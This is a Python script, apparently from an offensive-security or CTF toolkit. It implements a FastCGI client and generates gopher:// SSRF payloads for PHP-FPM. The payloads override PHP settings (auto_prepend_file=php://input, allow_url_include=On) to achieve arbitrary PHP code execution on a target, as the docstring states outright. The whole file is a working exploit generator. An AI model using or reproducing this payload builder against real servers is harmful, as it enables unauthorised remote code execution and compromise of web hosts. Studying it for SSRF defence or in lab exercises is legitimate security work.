# -*- coding:utf-8 -*-
import base64
import random
import argparse
import sys
from io import BytesIO
from six.moves.urllib import parse as urlparse

# Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client

PY2 = True if sys.version_info.major == 2 else False


def _bchr(i):
    if PY2:
        return _force_bytes(chr(i))
    else:
        return bytes([i])


def _bord(c):
    if isinstance(c, int):
        return c
    else:
        return ord(c)


def _force_bytes(s):
    if isinstance(s, bytes):
        return s
    else:
        return s.encode('utf-8', 'strict')


def _force_text(s):
    if issubclass(type(s), str):
        return s
    if isinstance(s, bytes):
        s = str(s, 'utf-8', 'strict')
    else:
        s = str(s)
    return s


class _FastCGIClient:
    """A Fast-CGI Client for Python"""

    # private
    __FCGI_VERSION = 1

    __FCGI_ROLE_RESPONDER = 1
    __FCGI_ROLE_AUTHORIZER = 2
    __FCGI_ROLE_FILTER = 3

    __FCGI_TYPE_BEGIN = 1
    __FCGI_TYPE_ABORT = 2
    __FCGI_TYPE_END = 3
    __FCGI_TYPE_PARAMS = 4
    __FCGI_TYPE_STDIN = 5
    __FCGI_TYPE_STDOUT = 6
    __FCGI_TYPE_STDERR = 7
    __FCGI_TYPE_DATA = 8
    __FCGI_TYPE_GETVALUES = 9
    __FCGI_TYPE_GETVALUES_RESULT = 10
    __FCGI_TYPE_UNKOWNTYPE = 11

    __FCGI_HEADER_SIZE = 8

    # request state
    FCGI_STATE_SEND = 1
    FCGI_STATE_ERROR = 2
    FCGI_STATE_SUCCESS = 3

    def __init__(self, host, port, timeout, keepalive):
        self.host = host
        self.port = port
        self.timeout = timeout
        if keepalive:
            self.keepalive = 1
        else:
            self.keepalive = 0
        self.sock = None
        self.requests = dict()

    def __encodeFastCGIRecord(self, fcgi_type, content, requestid):
        length = len(content)
        buf = _bchr(_FastCGIClient.__FCGI_VERSION) \
            + _bchr(fcgi_type) \
            + _bchr((requestid >> 8) & 0xFF) \
            + _bchr(requestid & 0xFF) \
            + _bchr((length >> 8) & 0xFF) \
            + _bchr(length & 0xFF) \
            + _bchr(0) \
            + _bchr(0) \
            + content
        return buf

    def __encodeNameValueParams(self, name, value):
        nLen = len(name)
        vLen = len(value)
        record = b''
        if nLen < 128:
            record += _bchr(nLen)
        else:
            record += _bchr((nLen >> 24) | 0x80) \
                + _bchr((nLen >> 16) & 0xFF) \
                + _bchr((nLen >> 8) & 0xFF) \
                + _bchr(nLen & 0xFF)
        if vLen < 128:
            record += _bchr(vLen)
        else:
            record += _bchr((vLen >> 24) | 0x80) \
                + _bchr((vLen >> 16) & 0xFF) \
                + _bchr((vLen >> 8) & 0xFF) \
                + _bchr(vLen & 0xFF)
        return record + name + value

    def __decodeFastCGIHeader(self, stream):
        header = dict()
        header['version'] = _bord(stream[0])
        header['type'] = _bord(stream[1])
        header['requestId'] = (_bord(stream[2]) << 8) + _bord(stream[3])
        header['contentLength'] = (_bord(stream[4]) << 8) + _bord(stream[5])
        header['paddingLength'] = _bord(stream[6])
        header['reserved'] = _bord(stream[7])
        return header

    def __decodeFastCGIRecord(self, buffer):
        header = buffer.read(int(self.__FCGI_HEADER_SIZE))

        if not header:
            return False
        else:
            record = self.__decodeFastCGIHeader(header)
            record['content'] = b''

            if 'contentLength' in record.keys():
                contentLength = int(record['contentLength'])
                record['content'] += buffer.read(contentLength)
            if 'paddingLength' in record.keys():
                skiped = buffer.read(int(record['paddingLength']))
            return record

    def request(self, nameValuePairs={}, post=''):
        # if not self.__connect():
        #     print('connect failure! please check your fasctcgi-server !!')
        #     return

        requestId = random.randint(1, (1 << 16) - 1)
        self.requests[requestId] = dict()
        request = b""
        beginFCGIRecordContent = _bchr(0) \
            + _bchr(_FastCGIClient.__FCGI_ROLE_RESPONDER) \
            + _bchr(self.keepalive) \
            + _bchr(0) * 5
        request += self.__encodeFastCGIRecord(_FastCGIClient.__FCGI_TYPE_BEGIN,
                                              beginFCGIRecordContent, requestId)
        paramsRecord = b''
        if nameValuePairs:
            for (name, value) in nameValuePairs.items():
                name = _force_bytes(name)
                value = _force_bytes(value)
                paramsRecord += self.__encodeNameValueParams(name, value)

        if paramsRecord:
            request += self.__encodeFastCGIRecord(
                _FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)
        request += self.__encodeFastCGIRecord(
            _FastCGIClient.__FCGI_TYPE_PARAMS, b'', requestId)

        if post:
            request += self.__encodeFastCGIRecord(
                _FastCGIClient.__FCGI_TYPE_STDIN, _force_bytes(post), requestId)
        request += self.__encodeFastCGIRecord(
            _FastCGIClient.__FCGI_TYPE_STDIN, b'', requestId)

        return request

    def __waitForResponse(self, requestId):
        data = b''
        while True:
            buf = self.sock.recv(512)
            if not len(buf):
                break
            data += buf

        data = BytesIO(data)
        while True:
            response = self.__decodeFastCGIRecord(data)
            if not response:
                break
            if response['type'] == _FastCGIClient.__FCGI_TYPE_STDOUT \
                    or response['type'] == _FastCGIClient.__FCGI_TYPE_STDERR:
                if response['type'] == _FastCGIClient.__FCGI_TYPE_STDERR:
                    self.requests['state'] = _FastCGIClient.FCGI_STATE_ERROR
                if requestId == int(response['requestId']):
                    self.requests[requestId]['response'] += response['content']
            if response['type'] == _FastCGIClient.FCGI_STATE_SUCCESS:
                self.requests[requestId]
        return self.requests[requestId]['response']

    def __repr__(self):
        return "fastcgi connect host:{} port:{}".format(self.host, self.port)


def generate_code_payload(host, port, phpcode, php_file_path):
    client = _FastCGIClient(host, port, 3, 0)
    params = dict()
    documentRoot = "/"
    uri = php_file_path

    if phpcode.startswith("<?php"):
        phpcode = phpcode[5:]
    elif phpcode.startswith("<?="):
        phpcode = phpcode[3:]
    elif phpcode.startswith("<?"):
        phpcode = phpcode[2:]
    if phpcode.endswith("?>"):
        phpcode = phpcode[:-2]
    if not phpcode.endswith(";"):
        phpcode += ";"

    phpcode = "<?php " + phpcode + "?>"
    params = {
        'GATEWAY_INTERFACE': 'FastCGI/1.0',
        'REQUEST_METHOD': 'POST',
        'SCRIPT_FILENAME': documentRoot + uri.lstrip('/'),
        'SCRIPT_NAME': uri,
        'QUERY_STRING': '',
        'REQUEST_URI': uri,
        'DOCUMENT_ROOT': documentRoot,
        'SERVER_SOFTWARE': 'php/fcgiclient',
        'REMOTE_ADDR': '127.0.0.1',
        'REMOTE_PORT': '11451',
        'SERVER_ADDR': '127.0.0.1',
        'SERVER_PORT': '80',
        'SERVER_NAME': "localhost",
        'SERVER_PROTOCOL': 'HTTP/1.1',
        'CONTENT_TYPE': 'application/text',
        'CONTENT_LENGTH': "%d" % len(phpcode),
        'PHP_VALUE': 'auto_prepend_file = php://input',
        'PHP_ADMIN_VALUE': 'allow_url_include = On\nopen_basedir = /'
    }
    return client.request(params, phpcode)


def gopherfastcgi_code(host: str = "127.0.0.1", port: int = 9000, phpcode: str = "phpinfo();", php_file_path: str = "/var/www/html/index.php", urlEncoding: bool = True):
    """generate gopher payload for attack fastcgi to arbitrary code execution.

    Args:
        host (str): target fastcgi host.
        port (str): target fastcgi port.
        phpcode (str, optional): code you want to run. Defaults to "phpinfo();".
        php_file_path (str, optional): a path to an existing PHP file. Defaults to "/var/www/html/index.php".
        urlEncoding (bool, optional): whether use url encoding payload. Defaults to True.
    Returns:
        str: generated payload
    """
    raw_payload = generate_code_payload(host, port, phpcode, php_file_path)
    request_ssrf = urlparse.quote(raw_payload)
    if urlEncoding:
        request_ssrf = urlparse.quote(raw_payload)
    return f"gopher://{host}:{port}/_{request_ssrf}"
